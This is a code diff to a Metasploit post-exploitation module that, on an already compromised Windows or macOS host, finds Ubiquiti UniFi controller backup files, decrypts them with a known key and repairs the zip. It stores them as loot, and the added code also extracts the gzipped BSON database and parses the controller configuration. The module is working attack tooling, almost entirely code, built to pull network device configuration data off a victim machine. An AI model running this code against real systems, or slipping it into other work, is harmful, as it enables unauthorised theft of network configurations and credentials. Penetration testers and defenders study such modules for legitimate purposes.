@@ -3,12 +3,13 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core/auxiliary/ubiquiti'
+require 'zlib'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::UserProfiles
   include Msf::Post::OSX::System
+  include Msf::Auxiliary::Ubiquiti
 
   def initialize(info={})
     super( update_info( info,
@@ -19,6 +20,7 @@ class MetasploitModule < Msf::Post
         a known encryption key, then attempted to be repaired by zip.  Meterpreter must be
         used due to the large file sizes, which can be flaky on regular shells to read.
         Confirmed to work on 5.10.19 - 5.10.23, but most likely quite a bit more.
+        If the zip can be repaired, the db will be extracted and information extracted.
       },
       'License'       => MSF_LICENSE,
       'Author'        =>
@@ -44,6 +46,29 @@ class MetasploitModule < Msf::Post
       ])
   end
 
+  def extract_and_process_db(db_path)
+    f = nil
+    Zip::File.open(db_path) do |zip_file|
+      # Handle entries one by one
+      zip_file.each do |entry|
+        # Extract to file
+        if entry.name == 'db.gz'
+          print_status('extracting db.gz')
+          gz = Zlib::GzipReader.new(entry.get_input_stream)
+          f = gz.read
+          gz.close
+        end
+      end
+    end
+    print_status('Converting config BSON to JSON')
+    unifi_config = bson_to_json(f)
+    if unifi_config == {}
+      print_bad('Error in conversion')
+      return
+    end
+    unifi_config_eater(session.session_host, session.session_port, unifi_config)
+  end
+
   def find_save_files(d)
     case session.platform
     when 'windows'
@@ -59,7 +84,7 @@ class MetasploitModule < Msf::Post
         next
       end
 
-      if not file.end_with? ".unf"
+      unless file.end_with? ".unf"
         next
       end
 
@@ -89,6 +114,7 @@ class MetasploitModule < Msf::Post
       loot_path = store_loot('ubiquiti.unifi.backup_decrypted_repaired', 'application/zip', session,
                              repaired, "#{file}.zip", 'Ubiquiti Unifi Controller Backup Zip')
       print_good("File #{full} DECRYPTED and REPAIRED and saved to #{loot_path}.")
+      extract_and_process_db(loot_path)
     end
   end
 
